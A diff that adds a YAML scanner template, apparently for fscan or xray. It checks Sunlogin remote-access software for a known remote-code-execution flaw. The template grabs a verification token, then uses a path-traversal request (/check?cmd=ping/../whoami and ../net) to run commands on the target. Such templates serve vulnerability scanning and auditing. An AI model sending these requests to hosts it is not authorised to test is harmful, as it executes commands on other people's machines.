@@ -1,0 +1,30 @@
+name: sunlogin_rce_cnvd-2022-10270
+# 与xray 相同的是,fscan 的 body 也是 | 换行 ，expression 也是 >- 换行
+groups:
+  sunlogon1:
+    - method: GET
+      path: /cgi-bin/rpc?action=verify-haras
+      follow_redirects: false
+      search: '"verify_string":"(?P<code>[^"]+)"' 
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"verify_string")
+    - method: GET
+      path: /check?cmd=ping/../net
+      follow_redirects: false
+      headers:
+        Cookie: CID={{code}}
+      expression: >- 
+        response.status == 200 && response.body.bcontains(b'NET') 
+  sunlogin2:
+    - method: GET
+      path: /check?cmd=ping/../whoami
+      follow_redirects: false
+      headers:
+        Cookie: CID={{code}}
+      expression: >- 
+        response.status == 200 && response.body.bcontains(b'nt') 
+detail: 
+  links: 
+  authors:
+
+
